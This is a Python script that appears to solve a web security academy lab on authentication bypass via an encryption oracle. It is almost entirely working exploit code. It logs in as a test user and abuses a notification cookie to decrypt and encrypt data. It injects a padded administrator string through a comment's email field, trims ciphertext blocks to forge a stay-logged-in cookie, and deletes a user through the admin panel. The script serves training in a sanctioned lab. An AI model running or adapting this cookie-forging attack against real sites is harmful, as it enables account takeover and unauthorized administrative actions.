#############################################################################
#
# Lab: Authentication bypass via encryption oracle
#
# Hack Steps: 
#      1. Fetch the login page
#      2. Extract the csrf token and session cookie to login
#      3. Login as wiener
#      4. Extract the stay-logged-in cookie
#      5. Fetch a post page with the stay-logged in cookie value 
#         in the notification cookie to decrypt it
#      6. Extract the decrypted value
#      7. Extract the csrf token to post a comment
#      8. Post a comment with <PADDING>administrator:<NUMBER> 
#         in the email field (where PADDING is 9 bytes and and NUMBER is 
#         extracted from the decrypted value in the previous step )
#      9. Extract the notification cookie
#      10. Decode the notification cookie with base64
#      11. Remove the first two blocks and encode the remaining blocks
#      12. Place the last encoded value in the stay-logged-in cookie 
#          and delete carlos
#
#############################################################################
import requests
from urllib.parse import (unquote, quote)
import re
from colorama import Fore
import base64

# Change this to your lab URL
LAB_URL = "https://0a4800cb03f48e2484c0a0b9006f00f8.web-security-academy.net"

def main():
    
    login_page = fetch("/login")

    print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")

    session = login_page.cookies.get("session")
    csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie to login.. " + Fore.GREEN + "OK")

    data = { "username": "wiener", "password": "peter", "stay-logged-in": "on", "csrf": csrf }
    cookies = { "session": session }
    login_as_wiener = post_data("/login", data, cookies)
        
    print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. " + Fore.GREEN + "OK")

    session = login_as_wiener.cookies.get("session")
    stay_logged_in_cookie = login_as_wiener.cookies.get("stay-logged-in")

    print(Fore.WHITE + "⦗4⦘ Extracting the stay-logged-in cookie.. " + Fore.GREEN + "OK")

    cookies = { "session": session, "notification": stay_logged_in_cookie }
    post_page = fetch("/post?postId=1", cookies)
        
    print(Fore.WHITE + "⦗5⦘ Fetching a post page with the stay-logged in cookie value in the notification cookie to decrypt it.. " + Fore.GREEN + "OK")

    decrypted = re.findall("\s*(wiener:\w*)\s*</header>", post_page.text)[0]

    print(Fore.WHITE + "⦗6⦘ Extracting the decrypted value.. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + decrypted)

    csrf = re.findall("csrf.+value=\"(.+)\"", post_page.text)[0]

    print(Fore.WHITE + "⦗7⦘ Extracting the csrf token needed for posting a comment.. " + Fore.GREEN + "OK")

    numbers_part = decrypted.split(":")[1]
    admin_numbers_padding = f"123456789administrator:{numbers_part}"
    cookies = { "session": session }
    data = { "postId": "1", "comment": "not important", "name": "hacker", "email": admin_numbers_padding, "csrf": csrf }
    post_comment = post_data("/post/comment", data, cookies)
        
    print(Fore.WHITE + "⦗8⦘ Posting a comment with " + Fore.YELLOW + admin_numbers_padding + Fore.WHITE + " in the email field.. " + Fore.GREEN + "OK")

    notification_cookie = post_comment.cookies.get("notification")

    print(Fore.WHITE + "⦗9⦘ Extracting the notification cookie.. " + Fore.GREEN + "OK")

    notification_cookie_url_decoded = unquote(notification_cookie)
    base64_decoded = base64.b64decode(notification_cookie_url_decoded)

    print(Fore.WHITE + "⦗10⦘ Decoding the notification cookie with base64.. " + Fore.GREEN + "OK")

    first_two_blocks_removed = list(bytes(base64_decoded))[32:]
    base64_encoded = base64.b64encode(bytes(first_two_blocks_removed)).decode()

    print(Fore.WHITE + "⦗11⦘ Removing the first two blocks and encode the remaining blocks.. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + base64_encoded)

    cookies = { "stay-logged-in": quote(base64_encoded) }
    fetch("/admin/delete?username=carlos", cookies)

    print(Fore.WHITE + "⦗12⦘ Placing the last encoded value in the stay-logged-in cookie and delete carlos.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()
